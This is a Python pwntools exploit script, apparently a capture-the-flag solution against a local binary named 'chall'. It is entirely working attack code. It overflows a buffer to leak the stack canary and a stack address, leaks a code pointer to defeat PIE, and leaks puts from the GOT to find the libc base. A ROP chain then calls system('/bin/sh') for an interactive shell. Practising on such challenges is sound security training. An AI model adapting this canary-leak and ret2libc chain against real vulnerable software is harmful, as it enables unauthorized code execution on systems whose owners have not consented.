#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./chall")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def send_yes():
    io.recvline()
    io.sendline(b'y')
    io.recvline()


offset_to_canary = 0xa
CANARY = 0
STACK = 0

def leak_stack_and_canary():
    global CANARY,STACK
    send_yes()
    payload = b'A'*offset_to_canary 
    io.sendline(payload)
    io.recvline()
    CANARY = u64(io.recv(7).strip().rjust(8,b'\x00'))
    STACK = u64(io.recv(6).ljust(8,b'\x00'))




def defeat_pie():
    #pause()
    send_yes()
    payload = b'A'*offset_to_canary + b'B'*8 + b'C'*6 + b'DA'
    io.send(payload)
    io.recvuntil(b'DA')
    return u64(io.recv(6).ljust(8,b'\x00'))
     

io = start()

leak_stack_and_canary()

log.success(f'canary @ 0x{CANARY:02x}')

log.success(f'stack @ 0x{STACK:02x}')

io.recvuntil(b'feedback?')

payload = b''.join([
        b'A'*offset_to_canary,
        p64(CANARY)
    ])

io.sendline(payload)



'''
    defeat pie
'''
elf.address = defeat_pie() - 0x1447 
log.success(f'image base @ 0x{elf.address:02x}')


'''
    leak libc
'''

pop_rdi_ret = elf.address+0x14d3
ret = elf.address+0x101a

leak_libc = b''
leak_libc += p64(pop_rdi_ret)
leak_libc += p64(elf.got.puts)
leak_libc += p64(ret)
leak_libc += p64(elf.sym.puts)
leak_libc += p64(ret)
leak_libc += p64(elf.sym.main)

payload = b''.join([
        b'A'*offset_to_canary,
        p64(CANARY),
        p64(STACK),
        leak_libc
    ])

log.success(f'pop_rdi_ret @ 0x{pop_rdi_ret:02x}')
io.sendafter(b'feedback?',payload)
io.recvline()
leak = u64(io.recvline().strip().ljust(8,b'\x00'))

libc.address = leak - libc.sym.puts

log.success(f'libc base @ 0x{libc.address:02x}')

sh = next(libc.search(b'/bin/sh\x00'))

log.success(f'/bin/sh @ 0x{sh:02x}')


io.sendline(b'y')
io.sendline(b'AAA')
rop = b''
rop += p64(pop_rdi_ret)
rop += p64(sh)
rop += p64(ret)
rop += p64(libc.sym.system)


payload = b''.join([
    b'A'*offset_to_canary,
    p64(CANARY),
    p64(STACK),
    rop
    ])

io.sendline(payload)
io.interactive()
